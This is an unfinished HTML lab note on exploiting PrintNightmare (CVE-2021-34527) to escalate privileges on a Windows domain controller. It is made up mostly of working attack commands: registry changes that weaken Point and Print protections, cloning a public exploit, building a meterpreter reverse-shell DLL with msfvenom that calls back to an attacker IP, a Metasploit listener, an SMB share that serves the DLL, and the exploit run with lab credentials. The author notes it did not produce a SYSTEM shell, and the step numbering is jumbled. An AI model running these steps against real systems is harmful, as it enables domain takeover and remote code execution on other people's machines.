<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>PrintNightmare (CVE-2021-34527)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>PrintNightmare (CVE-2021-34527)</h1><br /><br /><strong>
      <h2>WARNING: TUTORIAL TO BE COMPLETED</h2>
    </strong><br /><strong><span style="color:#ff0000;">Something is not working, i have not got a SYSTEM shell at the
        end</span></strong><br /><strong>Prerequisites:</strong><br />• Username and password of a non administrative
    user <br />• PrintSpooler service active and not patched on the Windows machine<br /><br />This is a Privilege
    Escalation attack to become Domain Admin of the Active Directory<br />A remote code execution vulnerability exists
    when the <span style="text-decoration:underline;">Windows Print Spooler service</span> improperly performs
    privileged file operations. An attacker who successfully exploited this vulnerability could run arbitrary code with
    SYSTEM privileges. An attacker could then install programs; view, change, or delete data; or create new accounts
    with full user rights.<br /><br /><strong>Exploit RCE</strong><br />• <a
      href="https://github.com/cube0x0/CVE-2021-1675" target="_blank">https://github.com/cube0x0/CVE-2021-1675</a><br /><br /><br />0.
    Setup LAB <br /> On the Domain Controller of the Active Directory<br />
    <div class="codebox">
      <div class="codebox">
        reg&nbsp;add&nbsp;&quot;HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows&nbsp;NT\Printers\PointAndPrint&quot;&nbsp;/v&nbsp;RestrictDriverInstallationToAdministrators&nbsp;/t&nbsp;REG_DWORD&nbsp;/d&nbsp;0&nbsp;/f
      </div>
    </div><br />
    <div class="codebox">
      <div class="codebox">
        reg&nbsp;add&nbsp;&quot;HKLM\Software\Policies\Microsoft\Windows&nbsp;NT\Printers\PointAndPrint&quot;&nbsp;/v&nbsp;NoWarningNoElevationOnInstall&nbsp;/t&nbsp;REG_DWORD&nbsp;/d&nbsp;1
      </div>
    </div><br />
    <div class="codebox">
      <div class="codebox">
        REG&nbsp;QUERY&nbsp;&quot;HKLM\Software\Policies\Microsoft\Windows&nbsp;NT\Printers\PointAndPrint&quot;</div>
    </div> <br /> <a href=""><img src="images/1843-1.png" alt="images/1843-1.png" /></a><br />
    <div class="codebox">
      <div class="codebox">
        reg&nbsp;add&nbsp;“HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows&nbsp;NT\Printers”&nbsp;/v&nbsp;RegisterSpoolerRemoteRpcEndPoint&nbsp;/t&nbsp;REG_DWORD&nbsp;/d&nbsp;1
      </div>
    </div><br /> <br />1. Check if the environment is vulnerable<br /> To do that we need installed impacket or we can
    use the version of cube0x0 (author of the exploit) here: <a
      href="https://github.com/cube0x0/impacket" target="_blank">https://github.com/cube0x0/impacket</a><br />
    <div class="codebox">
      <div class="codebox">
        locate&nbsp;rpcdump.py<br />rpcdump.py&nbsp;@[IP_address_domain_controller]&nbsp;|&nbsp;egrep&nbsp;&#39;MS-RPRN|MS-PAR&#39;
      </div>
    </div><br /> <a href=""><img src="images/1843-2.png" alt="images/1843-2.png" /></a><br />2. Clone the cube0x0
    repository if you already do not have done it yet<br />
    <div class="codebox">
      <div class="codebox">git&nbsp;clone&nbsp;https://github.com/cube0x0/CVE-2021-1675.git<br />cd&nbsp;CVE-2021-1675
      </div>
    </div><br />4. Generate malicious DLL payload <br />
    <div class="codebox">
      <div class="codebox">
        msfvenom&nbsp;-p&nbsp;windows/x64/meterpreter/reverse_tcp&nbsp;LHOST=[attackerIP]&nbsp;LPORT=5555&nbsp;-f&nbsp;dll&nbsp;&gt;&nbsp;shell.dll
      </div>
    </div><br /> <span style="text-decoration:underline;">Note</span>: if we have access to the domain controller like
    in the lab scenario we can know the OS architeture(32 or 64 bit) with “wmic os get osarchitecture”<br /><br />3.
    Open a new windows on the Attacker machine and set the listener on the Attacker machine<br />
    <div class="codebox">
      <div class="codebox">
        $&nbsp;msfconsole<br />msf&gt;&nbsp;use&nbsp;multi/handler<br />msf&gt;&nbsp;options<br />msf&gt;&nbsp;set&nbsp;payload&nbsp;windows/x64/meterpreter/reverse_tcp<br />msf&gt;&nbsp;set&nbsp;lport&nbsp;5555<br />msf&gt;&nbsp;set&nbsp;lhost&nbsp;[attackerIP]<br />msf&gt;&nbsp;run
      </div>
    </div><br />4. Set up on the Attacker machine SMB File Sharing of the folder containg the malicious DLL created
    before with msfvenom<br />
    <div class="codebox">
      <div class="codebox">locate&nbsp;smbserver.py<br />smbserver.py&nbsp;share&nbsp;&#39;pwd&#39;&nbsp;-smb2support
      </div>
    </div><br /> <a href=""><img src="images/1843-3.png" alt="images/1843-3.png" /></a><br />6. Run the attack<br />
    <div class="codebox">
      <div class="codebox">
        python3&nbsp;CVE-2021-1675.py&nbsp;daniele/pparker:Password1@192.168.147.196&nbsp;&#39;\\192.168.147.139\share\shell.dll&#39;
      </div>
    </div><br /> <a href=""><img src="images/1843-4.png" alt="images/1843-4.png" /></a><br /> <a href=""><img
        src="images/1843-5.png" alt="images/1843-5.png" /></a><br /><br /><strong>Mitigation</strong><br />• <a
      href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527" target="_blank">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527</a><br /><br />
  </div>
</body>

</html>